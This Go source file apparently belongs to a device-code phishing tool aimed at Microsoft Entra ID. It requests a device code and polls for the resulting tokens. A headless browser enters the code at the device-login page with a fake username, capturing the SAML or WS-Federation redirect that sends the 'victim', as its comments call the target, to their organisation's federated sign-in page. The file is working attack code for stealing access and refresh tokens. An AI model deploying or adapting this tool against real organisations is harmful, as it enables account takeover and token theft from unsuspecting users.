package entra

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
)

type DeviceAuth struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationUri string `json:"verification_uri"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
}

type AuthenticationResult struct {
	TokenType    string `json:"token_type"`
	Scope        string `json:"scope"`
	AccessToken  string `json:"access_token"`
	IdToken      string `json:"id_token"`
	RefreshToken string `json:"refresh_token"`
	ExpiresIn    int    `json:"expires_in"`
}

type AuthenticationError struct {
	Type        string `json:"error"`
	Description string `json:"error_description"`
}

const (
	PENDING string = "authorization_pending"
)

// https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code
func RequestDeviceAuth(tenant string, clientId string, scopes []string) (*DeviceAuth, error) {
	resp, err := http.PostForm("https://login.microsoftonline.com/"+tenant+"/oauth2/v2.0/devicecode",
		url.Values{"client_id": {clientId}, "scope": {strings.Join(scopes, " ")}})

	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		errMsg := "Request failed with status code:" + resp.Status
		return nil, errors.New(errMsg)
	}

	var deviceAuth DeviceAuth
	err = json.NewDecoder(resp.Body).Decode(&deviceAuth)

	if err != nil {
		return nil, err
	}
	return &deviceAuth, nil
}

func RequestToken(tenant string, clientId string, deviceAuth *DeviceAuth) (*AuthenticationResult, error) {
	resp, err := http.PostForm("https://login.microsoftonline.com/"+tenant+"/oauth2/v2.0/token",
		url.Values{"grant_type": {"urn:ietf:params:oauth:grant-type:device_code"}, "client_id": {clientId}, "device_code": {deviceAuth.DeviceCode}})

	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		if resp.StatusCode == http.StatusBadRequest {
			var authErr AuthenticationError
			err = json.NewDecoder(resp.Body).Decode(&authErr)
			if err != nil {
				return nil, err
			}

			if authErr.Type == PENDING {
				return nil, nil
			} else if authErr.Type != "" {
				return nil, errors.New("Polling of device_code concluded with " + authErr.Type)
			}
		}

		errMsg := "Request failed with status code:" + resp.Status
		return nil, errors.New(errMsg)
	}

	var authResult AuthenticationResult
	err = json.NewDecoder(resp.Body).Decode(&authResult)

	if err != nil {
		return nil, err
	}

	return &authResult, nil
}

// FederatedRedirect holds the data needed to redirect the victim to the
// federated IdP. Supports both SAML (POST with form data) and WS-Federation
// (GET redirect with all state in URL parameters).
type FederatedRedirect struct {
	URL      string            // The federated IdP endpoint URL
	Method   string            // "POST" (SAML) or "GET" (WS-Fed)
	PostData map[string]string // Form fields for SAML POST; nil for WS-Fed GET
}

func EnterDeviceCodeWithHeadlessBrowser(deviceAuth *DeviceAuth, userAgent string, targetDomain string) (*FederatedRedirect, error) {
	slog.Info("Starting headless browser automation", "userCode", deviceAuth.UserCode, "targetDomain", targetDomain)

	allocatorOpts := chromedp.DefaultExecAllocatorOptions[:]
	allocatorOpts = append(allocatorOpts, chromedp.Flag("headless", true))
	allocatorOpts = append(allocatorOpts, chromedp.UserAgent(userAgent))
	ctx, cancel := chromedp.NewExecAllocator(context.Background(), allocatorOpts...)

	var contextOpts []chromedp.ContextOption
	contextOpts = append(contextOpts, chromedp.WithDebugf(slog.Debug))
	ctx, cancel = chromedp.NewContext(ctx, contextOpts...)

	defer cancel()

	var currentUrl string

	// Generate a random username for the target domain
	fakeUpn := randomUsername() + "@" + targetDomain

	// Channel to receive the captured federated redirect from network events
	fedCh := make(chan *FederatedRedirect, 1)

	// Listen for network requests to capture cross-origin federated redirects.
	// Supports two protocols:
	//   - SAML: POST with SAMLRequest in body
	//   - WS-Federation: GET with wa=wsignin1.0 in URL
	chromedp.ListenTarget(ctx, func(ev interface{}) {
		req, ok := ev.(*network.EventRequestWillBeSent)
		if !ok {
			return
		}
		// Only interested in cross-origin requests leaving Microsoft
		if strings.Contains(req.Request.URL, "login.microsoftonline.com") ||
			strings.Contains(req.Request.URL, "msftauth.net") ||
			strings.Contains(req.Request.URL, "msauthimages.net") {
			return
		}

		// Check for SAML POST redirect
		if req.Request.Method == "POST" && req.Request.HasPostData && len(req.Request.PostDataEntries) > 0 {
			var rawBody strings.Builder
			for _, entry := range req.Request.PostDataEntries {
				decoded, err := base64.StdEncoding.DecodeString(entry.Bytes)
				if err != nil {
					rawBody.WriteString(entry.Bytes)
				} else {
					rawBody.Write(decoded)
				}
			}
			body := rawBody.String()

			if strings.Contains(body, "SAMLRequest") {
				slog.Info("Captured SAML POST to federated IdP",
					"url", req.Request.URL,
					"postDataLength", len(body))

				formData := make(map[string]string)
				values, err := url.ParseQuery(body)
				if err != nil {
					slog.Error("Failed to parse SAML POST data", "error", err)
					return
				}
				for key, vals := range values {
					if len(vals) > 0 {
						formData[key] = vals[0]
					}
				}

				select {
				case fedCh <- &FederatedRedirect{
					URL:      req.Request.URL,
					Method:   "POST",
					PostData: formData,
				}:
				default:
				}
				return
			}
		}

		// Check for WS-Federation GET redirect
		if req.Request.Method == "GET" && req.Type == network.ResourceTypeDocument {
			if strings.Contains(req.Request.URL, "wa=wsignin1.0") ||
				strings.Contains(req.Request.URL, "wsfed") ||
				strings.Contains(req.Request.URL, "wtrealm=urn") {
				slog.Info("Captured WS-Federation GET redirect to federated IdP",
					"url", req.Request.URL)

				select {
				case fedCh <- &FederatedRedirect{
					URL:    req.Request.URL,
					Method: "GET",
				}:
				default:
				}
				return
			}
		}
	})

	slog.Info("Step 1: Navigating to devicelogin and entering code")
	err := chromedp.Run(ctx,
		chromedp.Navigate(`https://microsoft.com/devicelogin`),

		chromedp.WaitVisible(`#idSIButton9`),
		chromedp.SendKeys(`#otc`, deviceAuth.UserCode),
		chromedp.Click(`#idSIButton9`),
	)
	if err != nil {
		return nil, err
	}

	// Capture URL after code submission
	chromedp.Run(ctx, chromedp.Location(&currentUrl))
	slog.Info("Step 1 complete: Code submitted", "url", currentUrl)

	slog.Info("Step 2: Waiting for sign-in page")
	err = chromedp.Run(ctx,
		chromedp.WaitVisible(`#i0116`),
		chromedp.Location(&currentUrl),
	)
	if err != nil {
		return nil, err
	}
	slog.Info("Step 2 complete: Email input visible", "url", currentUrl)

	slog.Info("Step 3: Entering federated username to trigger IdP redirect", "upn", fakeUpn)
	err = chromedp.Run(ctx,
		chromedp.SendKeys(`#i0116`, fakeUpn),
		chromedp.Click(`#idSIButton9`),
	)
	if err != nil {
		return nil, err
	}
	slog.Info("Step 3 complete: Username submitted")

	// Step 4: Wait for the network listener to capture the federated redirect
	slog.Info("Step 4: Waiting for federated IdP redirect (SAML POST or WS-Fed GET)")
	select {
	case result := <-fedCh:
		slog.Info("Browser automation complete",
			"method", result.Method,
			"idpUrl", result.URL)
		return result, nil
	case <-time.After(15 * time.Second):
		return nil, errors.New("timed out waiting for federated IdP redirect")
	}
}

// randomUsername generates a simple random username for federated redirect triggering
func randomUsername() string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	length := 6
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[time.Now().UnixNano()%int64(len(charset))]
		time.Sleep(1 * time.Nanosecond)
	}
	return string(b)
}
